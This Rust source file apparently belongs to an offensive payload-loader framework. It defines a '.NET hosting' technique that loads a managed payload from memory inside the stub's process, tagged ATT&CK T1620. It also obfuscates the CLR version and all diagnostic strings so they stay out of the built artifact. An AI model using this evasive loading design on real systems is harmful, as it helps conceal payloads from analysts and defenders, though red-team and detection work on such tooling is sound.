//! .NET hosting.
//!
//! Runs a managed (.NET) payload by hosting the CLR in the stub's own process
//! and loading the assembly from memory (`_AppDomain.Load_3`). A managed
//! assembly is not mapped as native code: its entry point calls
//! `mscoree.dll!_CorExeMain`, which starts the CLR for the process's main
//! module — the stub — instead of the payload. See `README.md`.

use serde::{Deserialize, Serialize};

use crate::engine::obfuscation::StringsConfig;

use super::{Capability, Category, Stability, TechniqueDef};

/// Parameters for .NET hosting.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct Params {
    /// Name of the payload in `build.payloads` to load. Optional when the plan
    /// declares exactly one payload.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub payload: Option<String>,
}

/// Static metadata for .NET hosting.
pub const DEF: TechniqueDef = TechniqueDef {
    name: "dotnet_hosting",
    attck: &["T1620"],
    stability: Stability::Experimental,
    requires: &[Capability::WindowsX64, Capability::WindowsX86],
    conflicts: &[],
    category: Category::Execution,
    doc_path: "src/techniques/dotnet_hosting/README.md",
    stub_fragment: include_str!("stub_fragment.rs"),
    params_example: "technique: dotnet_hosting",
    readme: include_str!("README.md"),
    // The CLR does its own memory management; the fragment issues no Nt* call.
    syscalls: &[],
    // The payload's import table belongs to the managed image, which the CLR
    // resolves itself: there is nothing to patch.
    resolves_imports: false,
};

/// Runtime diagnostics the fragment can emit, as `(placeholder, plaintext)`
/// pairs.
///
/// `render_fragment` replaces each placeholder with code that rebuilds the
/// message at runtime, so no diagnostic text lands in the generated stub's
/// `.rdata` (the same rule the other execution techniques follow).
const MESSAGES: &[(&str, &str)] = &[
    ("$MSG_NULL_INTERFACE$", "a hosting interface is null"),
    (
        "$MSG_QUERY_INTERFACE_FAILED$",
        "could not obtain the app-domain interface",
    ),
    ("$MSG_ARRAY_FAILED$", "could not build a COM array"),
    (
        "$MSG_CLR_CREATE_FAILED$",
        "could not create the runtime host",
    ),
    (
        "$MSG_CLR_RUNTIME_FAILED$",
        "could not load the requested runtime version",
    ),
    (
        "$MSG_CLR_HOST_FAILED$",
        "could not obtain the hosting interface",
    ),
    ("$MSG_CLR_START_FAILED$", "could not start the runtime"),
    (
        "$MSG_APPDOMAIN_FAILED$",
        "could not get the default app domain",
    ),
    (
        "$MSG_ASSEMBLY_LOAD_FAILED$",
        "could not load the assembly from memory",
    ),
    (
        "$MSG_ENTRY_POINT_FAILED$",
        "could not run the assembly's entry point",
    ),
];

impl Params {
    /// Renders the .NET-hosting stub fragment for these parameters.
    ///
    /// The CLR version and the environment variable it is published through are
    /// substituted as code that rebuilds them at runtime (using `strings`'s
    /// active strategy), so neither appears in the artifact's `strings`.
    pub fn render_fragment(&self, strings: &StringsConfig) -> String {
        let version_def = strings
            .obfuscate("v4.0.30319")
            .render_stub_expr("clr_version");
        let version_name_def = strings
            .obfuscate("COMPLUS_Version")
            .render_stub_expr("clr_version_name");

        let mut rendered = DEF.stub_fragment.to_string();
        for (index, (placeholder, text)) in MESSAGES.iter().enumerate() {
            rendered = rendered.replace(
                placeholder,
                &strings
                    .obfuscate(text)
                    .render_stub_expr(&format!("msg_{index}")),
            );
        }

        rendered
            .replace("$CLR_VERSION_DEF$", &version_def)
            .replace("$CLR_VERSION_NAME_DEF$", &version_name_def)
    }
}

#[cfg(test)]
mod tests;
